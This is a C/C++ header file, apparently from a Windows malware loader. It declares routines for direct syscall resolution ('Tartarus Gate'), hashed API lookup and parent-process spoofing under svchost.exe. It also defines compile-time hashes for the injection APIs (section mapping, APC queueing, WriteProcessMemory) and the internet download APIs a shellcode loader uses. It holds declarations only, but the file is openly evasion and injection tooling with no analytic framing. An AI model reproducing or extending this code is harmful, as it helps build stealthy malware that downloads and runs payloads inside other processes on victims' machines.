#pragma once

// -----------------------[ TARTARUS GATE CONSTANTS ]-----------------------

#define	UP		-32
#define	DOWN	 32
#define	RANGE  0xFF

// -----------------------[ FUNCTION DEFINITIONS ]-----------------------

BOOL GetModuleHandleCustom(
	IN	PWINAPI_MODULE	pWinApiMod
);

BOOL ResolveApis(
	OUT	PH_API			pK32HashedApi
);

BOOL ResolveSyscalls(
	OUT PSYSCALL_TABLE* ppSyscallTable
);

BOOL ResolveParentProcess(
	IN	PSYSCALL_TABLE	pSyscallTable,
	OUT	PHANDLE			phParent
);

BOOL Initialize(
	OUT PSYSCALL_TABLE* ppSyscallTable,
	OUT	PH_API* ppHashedApis,
	OUT	PHANDLE			phParent
);

// -----------------------[ HASH DEFINITIONS ]-----------------------

#include "HashCalc.h"

// define hashes for the WinAPI functions at compile-time
CTIME_HFOWLERW(CreateProcessW);
CTIME_HFOWLERW(WriteProcessMemory);
CTIME_HFOWLERW(DebugActiveProcessStop);
CTIME_HFOWLERW(InternetOpenW);
CTIME_HFOWLERW(InternetOpenUrlW);
CTIME_HFOWLERW(InternetSetOptionW);
CTIME_HFOWLERW(InternetReadFile);
CTIME_HFOWLERW(InternetCloseHandle);
CTIME_HFOWLERW(InitializeProcThreadAttributeList);
CTIME_HFOWLERW(UpdateProcThreadAttribute);

// define hashes for syscall wrappers at compile-time
CTIME_HFOWLERA(NtCreateSection);
CTIME_HFOWLERA(NtMapViewOfSection);
CTIME_HFOWLERA(NtClose);
CTIME_HFOWLERA(NtQueueApcThread);
CTIME_HFOWLERA(NtQuerySystemInformation);
CTIME_HFOWLERA(NtOpenProcess);
CTIME_HFOWLERA(NtUnmapViewOfSection);

// define hash for ntdll.dll, kernel32.dll and kernelbase.dll at compile-time
constexpr ULONG	NTDLL_FnvvW = HashStringFowlerNollVoVariant1aW(L"NTDLL.DLL");
constexpr ULONG KERNEL32_DLL_FnvvW = HashStringFowlerNollVoVariant1aW(L"KERNEL32.DLL");
constexpr ULONG	KERNELBASE_DLL_FnnvW = HashStringFowlerNollVoVariant1aW(L"KERNELBASE.DLL");

// define hash for parent process
constexpr ULONG	svchost_FnvvW = HashStringFowlerNollVoVariant1aW(L"svchost.exe");

// define runtime wrappers for hash-functions that can be used in files other than Resolve.cpp
#ifdef __cplusplus
extern "C" {
#endif
	ULONG RTIME_FnvHashW(LPCWSTR str);
	ULONG RTIME_FnvHashA(LPCSTR  str);
#ifdef __cplusplus
}
#endif